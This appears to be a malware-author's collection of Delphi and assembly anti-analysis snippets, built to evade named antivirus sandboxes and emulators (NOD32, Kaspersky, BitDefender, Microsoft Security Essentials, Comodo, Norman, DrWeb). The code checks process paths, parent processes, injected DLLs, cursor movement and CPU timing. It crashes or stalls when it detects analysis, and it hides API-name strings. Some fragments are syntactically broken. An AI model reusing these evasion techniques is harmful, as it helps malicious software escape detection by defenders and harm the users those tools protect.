 
	////////////////////////////////////////////////////
	// NOTE!!!
	////////////////////////////////////////////////////
	1. All palces with such code must be replaced to some fake but real code, for example ping to google and then ExitProcess() or etc
	// some fake actions here... or fault
		 xor eax, eax
		 call eax
	2. All code used here is position independent (PICODE) without DATA, can me mutated via some morphing engines.
	3. You can use some unhooking engines to avoid api hooks, but most functions are very RAW and effective because they use PEB to get current file name & path.
 
/////////////////////////////////////////////////////////////
//===========================================================
//              ANTI EMULATORS, ANTI SANDBOXES
//===========================================================
/////////////////////////////////////////////////////////////
 
  var 

	// peb variables
	  pb: PPeb32;
	  ldrdata      : PPebLdrData32;
	  ldrEntry     : PLdrDataTableEntry32;
	  EXEName      : array[0..1024] of WideChar;
	  MyAppName    : array[0..12] of WideChar;
	  
	// anti sandbox variables
	  hSnapShot: THandle;
	  xProcInfo: TProcessEntry32;
	  //ParentProcPath      : String;
	  //CreateToolhelp32Snapshot
	  //Process32First
	  //Process32Next
	  //GetCurrentProcessId
	  //OpenProcess
	  //GetModuleFileNameEx
	  //CloseHandle
	  CreateTLH: Array [0..24] of Char;
	  Process32First: Array [0..14] of Char;
	  Process32Next: Array [0..13] of Char;
	  hMem : HLOCAL;
	  ParentProcPath: array [0..1024] of Char;
	  //
	  xCreateToolhelp32Snapshot : function (dwFlags, th32ProcessID: DWORD): THandle stdcall;
	  xProcess32First : function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;
	  xProcess32Next : function (hSnapshot: THandle; var lppe: TProcessEntry32): BOOL stdcall;
	  xGetCurrentProcessId : function : DWORD; stdcall;
	  GetCurrentProcessId: Array [0..19] of Char;
	  ProcessId, ParentProcessId: Cardinal;
	  //ExeFileName: string;
	  ExeFileName: array[0..MAX_PATH - 1] of Char;// Path
	  szPython: Array [0..10] of Char;
	  szPerl: Array [0..8] of Char;
	  alph    :array[0..1] of WideChar;
	  ff:integer;
	  VBA32   :array[0..11] of WideChar;
	  NOD32   :array[0..8] of WideChar;
	  isMSE, isPerl, isPython, isVBA, isNOD : bool;
	  isDebug1, isDebug2, isDebug3 : bool;
 
  /////////////////////////////////////
  // Anti-Emulators & anti-sandboxes
  /////////////////////////////////////
  
  isMSE := false;
  isVBA := false;
  isNOD := false;
  isPerl := false;
  isPython := false;
  
  ///////////////////////////////
  // NOD32  //C:\t.exe
  ///////////////////////////////

  NOD32[0]:='C';
  NOD32[1]:=':';
  NOD32[2]:='\';
  NOD32[3]:='t';
  NOD32[4]:='.';
  NOD32[5]:='e';
  NOD32[6]:='x';
  NOD32[7]:='e';
  NOD32[8]:=#0;

  if
  (EXEName[0] = NOD32[0]) and
  (EXEName[1] = NOD32[1]) and
  (EXEName[2] = NOD32[2]) and
  (EXEName[3] = NOD32[3]) and
  (EXEName[4] = NOD32[4]) and
  (EXEName[5] = NOD32[5]) and
  (EXEName[6] = NOD32[6]) and
  (EXEName[7] = NOD32[7]) and
  (EXEName[8] = NOD32[8]) then
  begin
   isNOD := true;
  end;

  ///////////////////////////////
  // MSE  //C:\myapp.exe
  ///////////////////////////////

  MyAppName[0]:='C';
  MyAppName[1]:=':';
  MyAppName[2]:='\';
  MyAppName[3]:='m';
  MyAppName[4]:='y';
  MyAppName[5]:='a';
  MyAppName[6]:='p';
  MyAppName[7]:='p';
  MyAppName[8]:='.';
  MyAppName[9]:='e';
  MyAppName[10]:='x';
  MyAppName[11]:='e';
  MyAppName[12]:=#0;

  if
  (EXEName[0] = MyAppName[0]) and
  (EXEName[1] = MyAppName[1]) and
  (EXEName[2] = MyAppName[2]) and
  (EXEName[3] = MyAppName[3]) and
  (EXEName[4] = MyAppName[4]) and
  (EXEName[5] = MyAppName[5]) and
  (EXEName[6] = MyAppName[6]) and
  (EXEName[7] = MyAppName[7]) and
  (EXEName[8] = MyAppName[8]) and
  (EXEName[9] = MyAppName[9]) and
  (EXEName[10] = MyAppName[10]) and
  (EXEName[11] = MyAppName[11]) and
  (EXEName[12] = MyAppName[12]) then
  begin
   isMSE := true;
  end;
           
  ///////////////////////////////
  // VBA32  // C:\SELF.exe
  ///////////////////////////////

  VBA32[0]:='C';
  VBA32[1]:=':';
  VBA32[2]:='\';
  VBA32[3]:='S';
  VBA32[4]:='E';
  VBA32[5]:='L';
  VBA32[6]:='F';
  VBA32[7]:='.';
  VBA32[8]:='e';
  VBA32[9]:='x';
  VBA32[10]:='e';
  VBA32[11]:=#0;

  if
  (EXEName[0] = VBA32[0]) and
  (EXEName[1] = VBA32[1]) and
  (EXEName[2] = VBA32[2]) and
  (EXEName[3] = VBA32[3]) and
  (EXEName[4] = VBA32[4]) and
  (EXEName[5] = VBA32[5]) and
  (EXEName[6] = VBA32[6]) and
  (EXEName[7] = VBA32[7]) and
  (EXEName[8] = VBA32[8]) and
  (EXEName[9] = VBA32[9]) and
  (EXEName[10] = VBA32[10]) and
  (EXEName[11] = VBA32[11]) then
  begin
   isVBA := true;
  end;

  ///////////////////////////////
  // Parent Process Detection: isPerl and isPython
  ///////////////////////////////
  //
  szPython[0]:='p';szPython[1]:='y';szPython[2]:='t';szPython[3]:='h';szPython[4]:='o';szPython[5]:='n';szPython[6]:='.';szPython[7]:='e';szPython[8]:='x';szPython[9]:='e';szPython[10]:=#0;
  szPerl[0]:='p';szPerl[1]:='e';szPerl[2]:='r';szPerl[3]:='l';szPerl[4]:='.';szPerl[5]:='e';szPerl[6]:='x';szPerl[7]:='e';szPerl[8]:=#0;

  //CreateToolhelp32Snapshot
  CreateTLH[0]:='C';CreateTLH[1]:='r';CreateTLH[2]:='e';CreateTLH[3]:='a';CreateTLH[4]:='t';CreateTLH[5]:='e';CreateTLH[6]:='T';CreateTLH[7]:='o';CreateTLH[8]:='o';CreateTLH[9]:='l';CreateTLH[10]:='h';CreateTLH[11]:='e';CreateTLH[12]:='l';CreateTLH[13]:='p';CreateTLH[14]:='3';CreateTLH[15]:='2';CreateTLH[16]:='S';CreateTLH[17]:='n';CreateTLH[18]:='a';CreateTLH[19]:='p';CreateTLH[20]:='s';CreateTLH[21]:='h';CreateTLH[22]:='o';CreateTLH[23]:='t';CreateTLH[24]:=#0;
  Process32First[0]:='P';Process32First[1]:='r';Process32First[2]:='o';Process32First[3]:='c';Process32First[4]:='e';Process32First[5]:='s';Process32First[6]:='s';Process32First[7]:='3';Process32First[8]:='2';Process32First[9]:='F';Process32First[10]:='i';Process32First[11]:='r';Process32First[12]:='s';Process32First[13]:='t';Process32First[14]:=#0;
  Process32Next[0]:='P';Process32Next[1]:='r';Process32Next[2]:='o';Process32Next[3]:='c';Process32Next[4]:='e';Process32Next[5]:='s';Process32Next[6]:='s';Process32Next[7]:='3';Process32Next[8]:='2';Process32Next[9]:='N';Process32Next[10]:='e';Process32Next[11]:='x';Process32Next[12]:='t';Process32Next[13]:=#0;
  CloseHandle[0]:='C';CloseHandle[1]:='l';CloseHandle[2]:='o';CloseHandle[3]:='s';CloseHandle[4]:='e';CloseHandle[5]:='H';CloseHandle[6]:='a';CloseHandle[7]:='n';CloseHandle[8]:='d';CloseHandle[9]:='l';CloseHandle[10]:='e';CloseHandle[11]:=#0;
  //

  @xCreateToolhelp32Snapshot := xGetProcAddress(Kernel32Handle, CreateTLH);
  @xProcess32First := xGetProcAddress(Kernel32Handle, Process32First);
  @xProcess32Next := xGetProcAddress(Kernel32Handle, Process32Next);
  @xCloseHandle := xGetProcAddress(Kernel32Handle, CloseHandle);
  //
  GetCurrentProcessId[0]:='G';GetCurrentProcessId[1]:='e';GetCurrentProcessId[2]:='t';GetCurrentProcessId[3]:='C';GetCurrentProcessId[4]:='u';GetCurrentProcessId[5]:='r';GetCurrentProcessId[6]:='r';GetCurrentProcessId[7]:='e';GetCurrentProcessId[8]:='n';GetCurrentProcessId[9]:='t';GetCurrentProcessId[10]:='P';GetCurrentProcessId[11]:='r';GetCurrentProcessId[12]:='o';GetCurrentProcessId[13]:='c';GetCurrentProcessId[14]:='e';GetCurrentProcessId[15]:='s';GetCurrentProcessId[16]:='s';GetCurrentProcessId[17]:='I';GetCurrentProcessId[18]:='d';GetCurrentProcessId[19]:=#0;
  @xGetCurrentProcessId := xGetProcAddress(Kernel32Handle, GetCurrentProcessId);
  ProcessId := xGetCurrentProcessId();

  // Get info for current process
  hSnapShot := xCreateToolHelp32Snapshot($00000002, 0);
  if (hSnapShot <> THandle(-1)) then
 // try
    xProcInfo.dwSize := SizeOf(xProcInfo);

    if (xProcess32First(hSnapshot, xProcInfo)) then
      repeat
        if xProcInfo.th32ProcessID = ProcessId then
        begin
          //ExeFileName := xProcInfo.szExeFile;
          //asm int 3 end;
          for ff := 0 to 255 do begin
          ExeFileName[ff] := xProcInfo.szExeFile[ff];
          end;
          ParentProcessId := xProcInfo.th32ParentProcessID;
        end;
      until not xProcess32Next(hSnapShot, xProcInfo);
 // finally
    xCloseHandle(hSnapShot);
 // end;

  // Get info for parent process
  hSnapShot := xCreateToolHelp32Snapshot($00000002, 0);
  if (hSnapShot <> THandle(-1)) then
 // try
    xProcInfo.dwSize := SizeOf(xProcInfo);

    if (xProcess32First(hSnapshot, xProcInfo)) then
      repeat
        if xProcInfo.th32ProcessID = ParentProcessId then
        begin
          for ff := 0 to 255 do begin
          ExeFileName[ff] := xProcInfo.szExeFile[ff];
          end;
          ParentProcessId := xProcInfo.th32ParentProcessID;
          //Result := ExeFileName;  // orig exename
          //Exit;
        end;
      until not xProcess32Next(hSnapShot, xProcInfo);
// finally
    xCloseHandle(hSnapShot);
//  end;

 // asm int 3 end;

  //if POS("VBoxService.exe",procinfo.szExeFile)>0) then
 // if (ExeFileName = szPython) or (ExeFileName = szPerl) then begin

  if  // python.exe
  (ExeFileName[0] = szPython[0]) and
  (ExeFileName[1] = szPython[1]) and
  (ExeFileName[2] = szPython[2]) and
  (ExeFileName[3] = szPython[3]) and
  (ExeFileName[4] = szPython[4]) and
  (ExeFileName[5] = szPython[5]) and
  (ExeFileName[5] = szPython[5]) and
  (ExeFileName[5] = szPython[5]) and
  (ExeFileName[5] = szPython[5]) and
  (ExeFileName[5] = szPython[5]) then
  begin
  isPython := true;
  end;

  if  // perl.exe
  (ExeFileName[0] = szPerl[0]) and
  (ExeFileName[1] = szPerl[1]) and
  (ExeFileName[2] = szPerl[2]) and
  (ExeFileName[3] = szPerl[3]) and
  (ExeFileName[4] = szPerl[4]) and
  (ExeFileName[5] = szPerl[5]) and
  (ExeFileName[6] = szPerl[6]) and
  (ExeFileName[7] = szPerl[7]) then
  begin
  isPerl := true;
  end;


  // TODO:
  // add AutoIt3.exe detector
  // add some more anti stuff

if isMSE or 
   isVBA or isNOD or      // AVs Sandboxes
   isPerl or isPython              // LAB sandboxes
   {or isDebug1}                   // anti debugs
then begin
// variant I
  // fuck sandbox with incremental memory pump !! danger ;) or place exit code here
 { push PAGE_READWRITE
  push MEM_COMMIT
  push 10000
  push 0
  call xVirtualAlloc  }
// variant II : Long delay via loop
for MSEINTLOOP:=1 to 5 do begin
asm // Anti Emul Via Long Loop	 - worked 
  push eax
  push ebx
  push ecx
  MOV EDX,61A8h
@00407D1A:
  MOV EAX,3A98h
@00407D1F:
  INC EBX
  INC MSEINTLOOP
  DEC EAX
  JNZ @00407D1F
  DEC EDX
  JNZ @00407D1A
  pop eax
  pop ebx
  pop ecx
end;
end;
end;
 
  /////////////////////////////////////
  // Anti Norman Local Trick
  /////////////////////////////////////

  CloseHandle[5] := 'H';
  CloseHandle[9] := 'l';
  CloseHandle[10] := 'e';
  CloseHandle[0] := 'C';
  CloseHandle[1] := 'l';
  CloseHandle[11] := #0;
  CloseHandle[6] := 'a';
  CloseHandle[7] := 'n';
  CloseHandle[8] := 'd';
  CloseHandle[4] := 'e';
  CloseHandle[2] := 'o';
  CloseHandle[3] := 's';
  @xCloseHandle := xGetProcAddress(Kernel32Handle, CloseHandle);
  if xCloseHandle(0) then begin
  asm 
	// some fake actions here... or fault
	xor eax, eax
	call eax
	end;
	end;
	
  /////////////////////////////////////
  // Anti KAV Sandbox Trick
  /////////////////////////////////////

  MyAppName[0] := '.';
  MyAppName[1] := 'b';
  if (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(10) * 2))^ = MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(11) * 2))^ = MyAppName[0]) then
  asm
   // some fake actions here... or fault
	xor eax, eax
	call eax
  end;
  

	/////////////////////////////////////
	// Various AV Anti Emulator via stack checking
	/////////////////////////////////////

	Var
	GetConsoleAliasExesLengthW: Array [0..26] of Char;
	begin
	GetConsoleAliasExesLengthW[0]:='G';
	GetConsoleAliasExesLengthW[1]:='e';
	GetConsoleAliasExesLengthW[2]:='t';
	GetConsoleAliasExesLengthW[3]:='C';
	GetConsoleAliasExesLengthW[4]:='o';
	GetConsoleAliasExesLengthW[5]:='n';
	GetConsoleAliasExesLengthW[6]:='s';
	GetConsoleAliasExesLengthW[7]:='o';
	GetConsoleAliasExesLengthW[8]:='l';
	GetConsoleAliasExesLengthW[9]:='e';
	GetConsoleAliasExesLengthW[10]:='A';
	GetConsoleAliasExesLengthW[11]:='l';
	GetConsoleAliasExesLengthW[12]:='i';
	GetConsoleAliasExesLengthW[13]:='a';
	GetConsoleAliasExesLengthW[14]:='s';
	GetConsoleAliasExesLengthW[15]:='E';
	GetConsoleAliasExesLengthW[16]:='x';
	GetConsoleAliasExesLengthW[17]:='e';
	GetConsoleAliasExesLengthW[18]:='s';
	GetConsoleAliasExesLengthW[19]:='L';
	GetConsoleAliasExesLengthW[20]:='e';
	GetConsoleAliasExesLengthW[21]:='n';
	GetConsoleAliasExesLengthW[22]:='g';
	GetConsoleAliasExesLengthW[23]:='t';
	GetConsoleAliasExesLengthW[24]:='h';
	GetConsoleAliasExesLengthW[25]:='W';
	GetConsoleAliasExesLengthW[26]:=#0;
 xGetConsoleAliasExesLengthW := xGetProcAddress(Kernel32Handle, GetConsoleAliasExesLengthW);
 asm
 call xGetConsoleAliasExesLengthW
 cmp dword ptr [esp-8h], 1h
 jz @IsNotEmulator2
	 // some fake actions here... or fault
	 xor eax, eax
	 call eax
 @IsNotEmulator2:
 end;
 
	/////////////////////////////////////
	// FPU Anti emulator
	/////////////////////////////////////

	asm
	finit
	push 1E2E0h
	push 0
	fild    qword PTR [ESP]
	movq qword ptr[esp],mm7
	pop eax
	pop eax
	add ebx, 0
	CMP EAX,0F1700000h
	JE @0040B2A7
	CVTDQ2PD XMM3,XMM5
		// some fake actions here... or fault
		 xor eax, eax
		 call eax
	@0040B2A7:
	end;
	
	/////////////////////////////////////
	// Anti BitDef
	/////////////////////////////////////

	for j := 1 to 98881 do begin
	for n := 1 to 2388 do begin
	asm
	jmp @tvvv
	db 0Fh
	db 0ABh
	db 0C0h
	db 87h
	db 0C0h
	db 0Fh
	db 0BDh
	db 0C6h
	db 0ECh
	@tvvv:
	inc p
	end;
	end;
	end;
	
	/////////////////////////////////////
	// Anti MSE sadnbox (old var) - C:\myapp.exe cheking
	/////////////////////////////////////
 
  // MSE
  MyAppName2[3] := 'm';
  MyAppName2[4] := 'y';
  MyAppName2[2] := 'p';                              //C:\myapp.exe
  if (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(4) * 2))^ = MyAppName2[4]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(7) * 2))^ = MyAppName2[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(3) * 2))^ = MyAppName2[3]) then
  begin
 asm
		  INC EAX                                  // Superfluous prefix
		ROL DWORD PTR DS:[EDX],44h                // Shift constant out of range 1..31
		IN AL,DX                                 // I/O command
		ADD AH,AL
		 // some fake actions here... or fault
		 xor eax, eax
		 call eax
  end;
  end;  

	/////////////////////////////////////
	// Anti VBA32 Sandbox - C:\SELF.exe cheking
	/////////////////////////////////////

  VBA32[5] := 'L';
  VBA32[7] := '.';
  if
  (EXEName[5] = VBA32[5]) and
  (EXEName[7] = VBA32[7]) then
  asm
	// some fake actions here... or fault
		 xor eax, eax
		 call eax
  end;    

  
  	/////////////////////////////////////
	// Anti NOD32 Sandbox - C:\t.exe cheking
	/////////////////////////////////////

  MyAppName[0] := 't';
  MyAppName[1] := '.';              
  MyAppName[2] := 'x';
  if
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(4) * 2))^ <> MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(6) * 2))^ <> MyAppName[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(3) * 2))^ <> MyAppName[0]) then begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  
  
	/////////////////////////////////////
	// Various Sandbox Detection - C:\file.exe cheking
	/////////////////////////////////////

  MyAppName[0] := 'f';
  MyAppName[1] := 'i';              
  MyAppName[2] := 'l';
  MyAppName[3] := 'e';
  if
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(5) * 2))^ <> MyAppName[0]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(6) * 2))^ <> MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(7) * 2))^ <> MyAppName[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(8) * 2))^ <> MyAppName[3]) then begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  

	/////////////////////////////////////
	// Anti Comodo Online Sandbox - C:\analyzer\scan\ cheking
	/////////////////////////////////////

  MyAppName[0] := 'a';
  MyAppName[1] := 'n';              
  MyAppName[2] := 'a';
  MyAppName[3] := 'l';
  MyAppName[4] := 's';              
  MyAppName[5] := 'c';
  MyAppName[6] := 'a';
  MyAppName[7] := 'n';
  if
  // anal entry check
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(5) * 2))^ <> MyAppName[0]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(6) * 2))^ <> MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(7) * 2))^ <> MyAppName[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(8) * 2))^ <> MyAppName[3]) and
  // scan entry check
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(14) * 2))^ <> MyAppName[4]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(15) * 2))^ <> MyAppName[5]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(16) * 2))^ <> MyAppName[6]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(17) * 2))^ <> MyAppName[7]) and
  then begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  
	/////////////////////////////////////
	// Anti Norman Online Sandbox - C:\TEST\ cheking
	/////////////////////////////////////

  MyAppName[0] := 'T';
  MyAppName[1] := 'E';              
  MyAppName[2] := 'S';
  MyAppName[3] := 'T';
  if
  // TEST entry check
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(5) * 2))^ <> MyAppName[0]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(6) * 2))^ <> MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(7) * 2))^ <> MyAppName[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(8) * 2))^ <> MyAppName[3]) and
  // scan entry check
  then begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  
	/////////////////////////////////////
	// Anti-KAV Sandbox  - C:\ohcbulyb.exe checking
	/////////////////////////////////////

  MyAppName[0] := 'o';
  MyAppName[1] := 'h';              
  MyAppName[2] := 'c';
  MyAppName[3] := 'b';
  MyAppName[4] := 'u';              
  MyAppName[5] := 'l';
  MyAppName[6] := 'y';
  MyAppName[7] := 'b';
  if
  // ohcbulyb entry check
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(5) * 2))^ <> MyAppName[0]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(6) * 2))^ <> MyAppName[1]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(7) * 2))^ <> MyAppName[2]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(8) * 2))^ <> MyAppName[3]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(9) * 2))^ <> MyAppName[4]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(10) * 2))^ <> MyAppName[5]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(11) * 2))^ <> MyAppName[6]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(12) * 2))^ <> MyAppName[7]) and
  // scan entry check
  then begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  
	/////////////////////////////////////
	// Anti VBA32 Sandbox - C:\SELF.exe check
	/////////////////////////////////////

  MyAppName[0] := 'L';
  MyAppName[1] := 'S';
  if
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(5) * 2))^ <> MyAppName[0]) and
  (PWideChar(dword(ldrEntry.FullDllName.Buffer)+(dword(3) * 2))^ <> MyAppName[1]) then
  begin
  asm
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
	end;
  end;
  
  
	/////////////////////////////////////
	// Anti Emulator DrWeb - SSE exploiting
	/////////////////////////////////////

  asm
  UCOMISD XMM5,XMM2       //;(unordered compare)
  COMISD XMM1,XMM5        //;look at lowest only - result in eflags
  CVTPD2PS XMM6,XMM0
  end;

  
 
	/////////////////////////////////////
	// Anti emulator via KUSER_SHARED_DATA (used to decrypt strategical places of encrypted code). Need to be debugged and used throw SEH
	/////////////////////////////////////
 
	asm
		push 7FFDFFF8h
		@LOOP_START:
		clc
		mov eax, [esp]
		// eax <== 7ffdfff8
		push ecx
		pop ecx
		// access KUSER_SHARED_DATA
		// [eax+328] = 0x7ffe0320 TickCountQuad
		mov ecx, [eax+328h]
		// [eax+8] = 0x7ffe0000 TickCountLow
		add ecx, [eax+8]
		shr ecx, 2
		// edi points to an encrypted data area
		mov eax, [edi]
		movsx ecx, cl
		xor eax, ebx
		xor eax, ecx
		xor al, 4Dh
		jnz @LOOP_START
		add esp, 4
	end; 
	
	/////////////////////////////////////
	// Various Anti Online Sandobx via GetCursorPos exploiting (still work against some sandbox)
	/////////////////////////////////////

  User32[0] := 'u';
  User32[1] := 's';
  User32[2] := 'e';
  User32[3] := 'r';
  User32[4] := '3';
  User32[5] := '2';
  User32[6] := #0;



  GetCursorPos[0] := 'G';
  GetCursorPos[1] := 'e';
  GetCursorPos[2] := 't';
  GetCursorPos[3] := 'C';
  GetCursorPos[4] := 'u';
  GetCursorPos[5] := 'r';
  GetCursorPos[6] := 's';
  GetCursorPos[7] := 'o';
  GetCursorPos[8] := 'r';
  GetCursorPos[9] := 'P';
  GetCursorPos[10] := 'o';
  GetCursorPos[11] := 's';
  GetCursorPos[12] := #0;

  @xGetCursorPos := xGetProcAddress(xLoadLibraryA(User32), GetCursorPos);

  CC := 0;
  J := 0;
  K := 0;
  for i:= 1 to 1000 do
  begin
  xGetCursorPos(pt);
  if (pt.X <> J) and (pt.Y <> K) then inc(CC);
  J := pt.X;
  K := pt.Y;
  end;
  if CC > 950 then
  begin
  asm 
// some fake actions here... or fault
		 xor eax, eax
		 call eax
	 end;
  end;
  

	/////////////////////////////////////
	// Anti Online Sandbox Via SetPixel\GetPixel
	// +TODO: SetClipboard / SetClipboard antiemulator 
	/////////////////////////////////////

  gdi32[0] := 'g';
  gdi32[1] := 'd';
  gdi32[2] := 'i';
  gdi32[3] := '3';
  gdi32[4] := '2';
  gdi32[5] := '.';
  gdi32[6] := 'd';
  gdi32[7] := 'l';
  gdi32[8] := 'l';
  gdi32[9] := #0;

  user32[0] := 'u';
  user32[1] := 's';
  user32[2] := 'e';
  user32[3] := 'r';
  user32[4] := '3';
  user32[5] := '2';
  user32[6] := '.';
  user32[7] := 'd';
  user32[8] := 'l';
  user32[9] := 'l';
  user32[10] := #0;

  GetTextColor[0] := 'G';
  GetTextColor[1] := 'e';
  GetTextColor[2] := 't';
  GetTextColor[3] := 'T';
  GetTextColor[4] := 'e';
  GetTextColor[5] := 'x';
  GetTextColor[6] := 't';
  GetTextColor[7] := 'C';
  GetTextColor[8] := 'o';
  GetTextColor[9] := 'l';
  GetTextColor[10] := 'o';
  GetTextColor[11] := 'r';
  GetTextColor[12] := #0;

  SetTextColor[0] := 'G';
  SetTextColor[1] := 'e';
  SetTextColor[2] := 't';
  SetTextColor[3] := 'T';
  SetTextColor[4] := 'e';
  SetTextColor[5] := 'x';
  SetTextColor[6] := 't';
  SetTextColor[7] := 'C';
  SetTextColor[8] := 'o';
  SetTextColor[9] := 'l';
  SetTextColor[10] := 'o';
  SetTextColor[11] := 'r';
  SetTextColor[12] := #0;

  GetDC[0] := 'G';
  GetDC[1] := 'e';
  GetDC[2] := 't';
  GetDC[3] := 'D';
  GetDC[4] := 'C';
  GetDC[5] := #0;

  @xLoadLibraryA := xGetProcAddress(Kernel32Handle, LoadLibraryA);
  Gdi32handle    := xLoadLibraryA(gdi32);
  user32handle   := xLoadLibraryA(user32);


  @xSetTextColor := xGetProcAddress(gdi32handle, SetTextColor);
  @xGetTextColor := xGetProcAddress(gdi32handle, GetTextColor);
  @xGetDC        := xGetProcAddress(user32handle, GetDC);

  //asm int 3 end;
  xSetPixel(xGetDC(0),100,100,11);
  if (xGetPixel(xGetDC(0),100,100) = 11) then  then begin
  // very long loop here...
  end;
  

	/////////////////////////////////////
	// Various Sandbox and Virtualization Detection
	/////////////////////////////////////
 
bool f_AntiInjectedSandboxDlls()
{
	bool ret = false;
	wchar_t *Modules[] = { 
		L"dbghelp.dll", //(vmware)
		L"pstorec.dll", //(SunBelt SandBox)
		L"vmcheck.dll", //(Virtual PC)
		L"api_log.dll", //(SunBelt SandBox)
		L"wpespy.dll", //(WPE Pro)
		L"SbieDll.dll", //(Sandboxie)
		L"dir_watch.dll" //(SunBelt SandBox)
	};

	for (int i = 0; i < _countof(Modules); i++)
	if (GetModuleHandleW(Modules[i])) 
	return true;
}


/////////////////////////////////////////////////////////////
//===========================================================
//                    DELAYS, TIMING ATTACKS
//===========================================================
/////////////////////////////////////////////////////////////


	/////////////////////////////////////
	// Delay + Timing check attack trick #2
	/////////////////////////////////////

  xGetSystemTime(st);
  sec := st.wSecond + 3;
  if (sec >= 59) then
  sec := sec - 59;
  // some trash code here...
  while sec <> st.wSecond
  do xGetSystemTime(st);
  
  // Delay Anti-emulator trick #3
  xGetSystemTime(st);
  sec := st.wSecond + 2;
  if (sec >= 59) then sec := sec - 59;
  while sec <> st.wSecond do begin xGetSystemTime(st); 
  end;
  end;   

	/////////////////////////////////////
	// Timing attack trick #5
	/////////////////////////////////////
	
 var
 vk : integer;
 asm
	 push ebx 
	 push edi 
	@@r1: 
	 db $0f, $31
	 mov edi, edx 
	 mov ebx, eax 
	 db $0f, $31 
	 cmp edi, edx 
	 jnz @@r1 
	 sub eax, ebx 
	 mov vk, eax
	 mov ecx, $0a
	@@cycle: 
	 db $0f, $31 
	 mov edi, edx 
	 mov ebx, eax 
	 db $0f, $31 
	 cmp edi, edx 
	 jnz @@cycle 
	 sub eax, ebx
	 cmp eax, vk
	 jg @@ext1 
	 mov vk, eax
	@@ext1: 
	 dec ecx 
	 jnz @@cycle 
	 mov eax, vk
	 pop edi 
	 pop ebx 
   end;
// Suspectious time of running thread
if vk > 200 then asm
// very long loop here...
	db 0Fh
	db 0ABh
	db 0C0h
	db 87h
	db 0C0h
	db 0Fh
	db 0BDh
	db 0C6h
	db 0ECh
end;

	/////////////////////////////////////
	// Timing attack via long loop (not hookable) trick #6
	// Use it in "// very long loop here..." places of src
	/////////////////////////////////////
	
var hvZ, zvH:integer;
for hvZ:=1 to 4 do begin
	asm // ;// Anti Emul Via Long Loop	 - worked
	push eax
	push ebx
	push ecx
	MOV EDX,61A8h
	@00407D1A:
	MOV EAX,3A98h
	@00407D1F:
	INC EBX
	INC zvH
	DEC EAX
	JNZ @00407D1F
	DEC EDX
	JNZ @00407D1A
	pop eax
	pop ebx
	pop ecx
	end;
end;
if zvH < 10000 then begin
asm
	// some fake actions here... or fault
		 xor eax, eax
		 call eax 
end;
end;

	/////////////////////////////////////
	// Timing attack trick #4
	/////////////////////////////////////

	time1 := 0;
	time2 := 0;
	asm
		RDTSC
		MOV time1,EAX
		RDTSC
		MOV time2, EAX
	end;

	if ((time2 - time1) > 100)
	then begin
		asm 
		// some fake actions here... or fault
		 xor eax, eax
		 call eax 
		end;
	end; 
	
	/////////////////////////////////////
	// Delay via RDTSC opcode - Timing attack trick #7
	/////////////////////////////////////

  asm
	 RDTSC
	 MOV EDX, EAX
	 @Loop:
	 RDTSC
	 SUB EAX, EDX
	 JA @Loop
 end;
 
	/////////////////////////////////////
	// Delay + Timing check attack - Timing attack trick #6
	/////////////////////////////////////

  xGetSystemTime(st);
  sec:=st.wMilliseconds;
  //if st.wMilliseconds <> 60 then
  asm
  cmp cx, sec
  je @exit
  // some fake actions here... or fault
		 xor eax, eax
		 call eax
  in ax, 3h
  @exit:
  end;  
	
	